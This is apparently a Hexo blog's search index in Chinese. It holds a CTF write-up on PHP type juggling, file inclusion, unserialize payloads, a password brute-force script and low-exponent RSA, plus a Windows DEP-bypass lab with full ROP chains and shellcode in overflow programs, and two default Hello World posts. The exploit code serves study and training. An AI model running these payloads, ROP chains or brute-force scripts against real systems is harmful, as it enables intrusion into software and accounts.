<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[世安杯WP]]></title>
    <url>%2F2017%2F10%2F17%2F%E4%B8%96%E5%AE%89%E6%9D%AFWP%2F</url>
    <content type="text"><![CDATA[asdads ctf入门及题目有源码 123456789101112&lt;?php$flag = &apos;*********&apos;;if (isset ($_GET[&apos;password&apos;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) echo &apos;&lt;p class=&quot;alert&quot;&gt;You password must be alphanumeric&lt;/p&gt;&apos;; else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE) die($flag); else echo &apos;&lt;p class=&quot;alert&quot;&gt;Invalid password&lt;/p&gt;&apos;;&#125;?&gt; 直接ereg 判断必须为 alphanumeric 而strpos要求带–，想到利用阶段password=123%00– 曲奇饼发现有文件包含?line=&amp;file=a2V5LnR4dA==可以读到index.php源码 1234567891011121314151617&lt;?phperror_reporting(0); $file=base64_decode(isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;file=a2V5LnR4dA==&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;key.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); if(isset($_COOKIE[&apos;key&apos;]) &amp;&amp; $_COOKIE[&apos;key&apos;]==&apos;an_yun_tec&apos;)&#123; $file_list[2]=&apos;thisis_key.php&apos;; &#125; if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125; ?&gt; 然后审计下构造如下请求： $_COOKIE[‘key’]==’an_yun_tec’ ?file=thisis_key.php 拿到flag 类型有源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;?phpshow_source(__FILE__);$a=0;$b=0;$c=0;$d=0;if (isset($_GET[&apos;x1&apos;]))&#123; $x1 = $_GET[&apos;x1&apos;]; $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL; switch ($x1) &#123; case 0: case 1: $a=1; break; &#125;&#125;$x2=(array)json_decode(@$_GET[&apos;x2&apos;]);if(is_array($x2))&#123; is_numeric(@$x2[&quot;x21&quot;])?die(&quot;ha?&quot;):NULL; if(@$x2[&quot;x21&quot;])&#123; ($x2[&quot;x21&quot;]&gt;2017)?$b=1:NULL; &#125; if(is_array(@$x2[&quot;x22&quot;]))&#123; if(count($x2[&quot;x22&quot;])!==2 OR !is_array($x2[&quot;x22&quot;][0])) die(&quot;ha?&quot;); $p = array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;]); $p===false?die(&quot;ha?&quot;):NULL; foreach($x2[&quot;x22&quot;] as $key=&gt;$val)&#123; $val===&quot;XIPU&quot;?die(&quot;ha?&quot;):NULL; &#125; $c=1;&#125;&#125;$x3 = $_GET[&apos;x3&apos;];if ($x3 != &apos;15562&apos;) &#123; if (strstr($x3, &apos;XIPU&apos;)) &#123; if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123; $d=1; &#125; &#125;&#125;if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; include &quot;flag.php&quot;; echo $flag;&#125;?&gt; 第一个是switch没有加break，所以用0绕过第二个php 当字符串与数字比较时现将字符串转化为数字2018a绕过第三个同第二个绕过 0 ==‘XIPU’第四个 php 0e弱类型脚本如下 12345678910111213141516import randomimport stringimport redef md5(str): import hashlib m = hashlib.md5() m.update(str) return m.hexdigest()while 1: string = &apos;&apos; s = string.join(random.sample(&apos;qwertyuiopasdfghjklzxcvbnm1234567890&apos;,4)) if (re.findall(&apos;^0e[0-9]&#123;14,14&#125;$&apos;,md5(&apos;XIPU&apos;+s)[8:24])): print &apos;XIPU&apos;+s,md5(&apos;XIPU&apos;+s)[8:24] 登录发现源码有提示 五位数字的密码 写脚本跑吧 123456789101112131415161718192021222324252627282930# coding:utf-8import requestsimport reimport threadingr = requests.session()url = &apos;http://ctf1.shiyanbar.com/shian-s/index.php&apos;def get_rand(): s = r.get(url=url) return re.findall(&quot;[0-9]&#123;3,6&#125;&quot;,s.content)[0]def test(password): data = &#123; &apos;username&apos;:&apos;admin&apos;, &apos;password&apos;:password, &apos;randcode&apos;:get_rand() &#125; s = r.get(url=url,params=data) if &quot;密码错误&quot; not in s.content: print s.content,password exit()for i in range(9999): test(&quot;0&quot;*(5-len(str(i)))+str(i))for i in range(10000,100000): test(i) # print i admin有源码 123456789101112&lt;!--$user = $_GET[&quot;user&quot;];$file = $_GET[&quot;file&quot;];$pass = $_GET[&quot;pass&quot;];if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //class.php&#125;else&#123; echo &quot;you are not admin ! &quot;;&#125; --&gt; 文件包含利用伪协议绕过(file_get_contents($user,’r’)===”the user is admin” php://input 即可然后利用php://fiter/convert.base64-encode/resource=index.php读取源码发现是个反序列化 1234567891011121314151617181920212223242526272829303132&lt;?php$user = $_GET[&quot;user&quot;];$file = $_GET[&quot;file&quot;];$pass = $_GET[&quot;pass&quot;];if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; if(preg_match(&quot;/f1a9/&quot;,$file))&#123; exit(); &#125;else&#123; include($file); //class.php $pass = unserialize($pass); echo $pass; &#125;&#125;else&#123; echo &quot;you are not admin ! &quot;;&#125;?&gt;&lt;!--$user = $_GET[&quot;user&quot;];$file = $_GET[&quot;file&quot;];$pass = $_GET[&quot;pass&quot;];if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //class.php&#125;else&#123; echo &quot;you are not admin ! &quot;;&#125; -- 坑在这里 123include($file); //class.php $pass = unserialize($pass); echo $pass; 这里在提交最后的payload的时候必须include class.php因为里面有tostring方法 能echo执行 所以最后的payload为http://localhost:8000/?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;} RSA只给了nc ，那么8成是低加密指数攻击1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-__author__ = &apos;4ct10n&apos;from libnum import s2n,n2sfrom gmpy import rootn = 92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143e = 3c = 2044619806634581710230401748541393297937319i = 0while 1: res = root(c+i*n,3) if(res[1] == True): print n2s(res[0]) break print &quot;i=&quot;+str(i) i = i+1]]></content>
      <tags>
        <tag>新建,模板,小书匠</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全机制 DEP 绕过]]></title>
    <url>%2F2017%2F10%2F17%2F%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6DEP%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[0x01 简介DEP （Data Execution Prevention）数据保护机制，在XP SP3被引入，将地址改为不可执行，使得shellcode无法在指定位置执行。 0x02 绕过方法主要还是了解现有的一些绕过方法，0day漏洞上介绍了几种方法 Ret2libc ZwSetInformationProcess Ret2libc VirtualProtect Ret2libc VirtualAlloc 利用可执行内存 利用.NET 利用Java applet 大体上分为两种 利用可执行内存 直接关闭DEP 0x03 实验跟着书上的实验一步一步调吧，主要还是思想，学会思考的过程并不是为了最后的弹框，shellcode直接使用书上提供的健壮的代码 0x1 Ret2libc ZwSetInformationProcess进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API函数 ZwQueryInformationProcess 和 Zw SetInformationProcess 进行查询和修改，所以可以直接将进程的 DEP 保护关闭。 _KEXECUTE_OPTIONS 的结构12345678910111213typedef struct _KEXECUTE_OPTIONS&#123;UCHAR Value; /*Pos0ExecuteDisable :1bitPos1ExecuteEnable :1bitPos2DisableThunkEmulation :1bitPos3Permanent :1bitPos4ExecuteDispatchEnable :1bitPos5ImageDispatchEnable :1bitPos6Spare :2bit*/&#125; KEXECUTE_OPTIONS; 了解了_KEXECUTE_OPTIONS的结构就可以用setinformationprocess设置相应的值，只需将第二位设置位1即可，所以关闭DEP的设置为 123456ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;ZwSetInformationProcess(NtCurrentProcess(), // (HANDLE)-1ProcessExecuteFlags, // 0x22&amp;ExecuteFlags, // ptr to 0x2sizeof(ExecuteFlags)); // 0x4 Q：这里有个问题为什么不直接传参调用函数执行A：答案是这里用的strcpy是，如果直接传参那么参数中肯定会有零字节，所以想到了利用现有的函数调用 T：因为微软为兼容性考虑，如果一个进程的 Permanent 位没有设置，当它加载 DLL时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭 这是利用这一个trick，绕过DEP，微软设立了一个函数LdrpCheckNXCompatibility满足下面三个条件之一就会触发 当 DLL 受 SafeDisc 版权保护系统保护时； 当 DLL 包含有.aspcak、.pcle、.sforce 等字节时； Windows Vista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions” T：我们可以利用ollyfindaddr插件寻找关闭DEP的起始位置，同时还有一些其他的辅助地址 shellcode的探索过程 T：retn x指令可以构造rop链，当然执行过程可以归结为下面一句话，在执行当前语句时他的下一条指令是esp的指向，下下一条指令则是esp+4+x，因此rop链的执行顺序就确定了 为了满足第一个条件必须将al设置为1，这里利用了一个rop链，但是接着发现在执行关闭DEP代码的时候ebp地址不可写，所以要在关闭DEP之前将可赋值地址写入ebp中，接着又发现esp不够高使得shellcode的被破坏，所以要抬高esp，下面才是执行DEP，还有一个坑在DEP的最后有一个leave操作所以，最后esp=ebp+4所以在retn的时候是返回到ebp+4的位置我们还记得给ebp赋值吗，没错就是这么巧妙，esp再次回去而且是jmp esp的位置一切都是这么巧妙。看起来是偶然的东西其实都是我们一手安排的。 贴出代码 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdlib.h&gt; #include&lt;string.h&gt; #include&lt;stdio.h&gt; #include&lt;windows.h&gt; char shellcode[]= &quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot; &quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot; &quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot; &quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot; &quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot; &quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot; &quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot; &quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot; &quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot; &quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot; &quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90&quot; &quot;\x52\xE2\x92\x7C&quot;//MOV EAX,1 RETN地址 &quot;\x85\x8B\x1D\x5D&quot;//修正EBP //&quot;\x19\x4A\x97\x7C&quot;//增大ESP &quot;\x45\x01\x88\x7c&quot;&quot;\xB4\xC1\xC5\x7D&quot;//jmp esp &quot;\x24\xCD\x93\x7C&quot;//关闭DEP代码的起始位置 &quot;\xE9\x33\xFF\xFF&quot;//回跳指令 &quot;\xFF\x90\x90\x90&quot; ; void test() &#123; char tt[176]; strcpy(tt,shellcode); &#125; int main() &#123; HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0; &#125; 或者用 1234567891011&quot;\x52\xE2\x92\x7C&quot;//MOV EAX,1 RETN地址 &quot;\x96\x73\x1B\x5D&quot;//修正EBP 8&quot;\x85\x8B\x1D\x5D&quot;//ebp 4&quot;\x90\x90\x90\x90&quot;&quot;\x90\x90\x90\x90&quot;//&quot;\x19\x4A\x97\x7C&quot;//增大ESP &quot;\x45\x01\x88\x7c&quot;//esp up&quot;\xB4\xC1\xC5\x7D&quot;//jmp esp &quot;\x24\xCD\x93\x7C&quot;//关闭DEP代码的起始位置 &quot;\xE9\x27\xFF\xFF&quot;//回跳指令 &quot;\xFF\x90\x90\x90&quot; 都是可以的只要是明白了retn的精髓那么构造shellcode就不是问题 0x2 VitualProtect1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374 // GS_Virtual.cpp : 定义控制台应用程序的入口点。 // #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; char shellcode[]= &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90&quot; &quot;\x94\xb0\x6c\x7d&quot; //0x7d6cb094 pop eax ret //&quot;\x34\x7a\xc1\x77&quot; //POP EBX POP ESI POP EDI RETN at 0x77c17a34 //&quot;\x26\x62\x92\x7d&quot; //POP ECX POP ECX POP ECX RETN at 0x7d926226 &quot;\x69\x36\x5C\x7D&quot; // pop edi,pop ebx,pop esi,retn &quot;\xe5\xe0\x72\x7d&quot; //0x7d72e0e5 push esp pop ebp ret 4 &quot;\x24\x01\x6f\x7d&quot; //ret &quot;\x90\x90\x90\x90&quot; &quot;\xc6\xc6\xeb\x77&quot; //77ebc6c6 push esp jmp eax &quot;\x10\x01\x00\x00&quot; //要修改的内存大小 &quot;\x40\x00\x00\x00&quot; //可读可写可执行属性代码 &quot;\xc6\xc6\xeb\x77&quot; //77ebc6c6 push esp jmp eax &quot;\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90&quot; &quot;\xD9\x1A\x80\x7C&quot;//修改内存属性 &quot;\x90\x90\x90\x90&quot; &quot;\xEB\x30\x5A\x7D&quot;//jmp esp &quot;\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90&quot; &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot; &quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot; &quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot; &quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot; &quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot; &quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot; &quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot; &quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot; &quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot; &quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot; &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot; &quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot; &quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot; ; void test() &#123; char tt[176]; printf(&quot;ttttttttttttttttttttt\n&quot;); memcpy(tt,shellcode,sizeof(shellcode) + 1); &#125; int main() &#123; HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0; &#125;]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>机制</tag>
        <tag>DEP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F10%2F17%2Faction%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F10%2F17%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
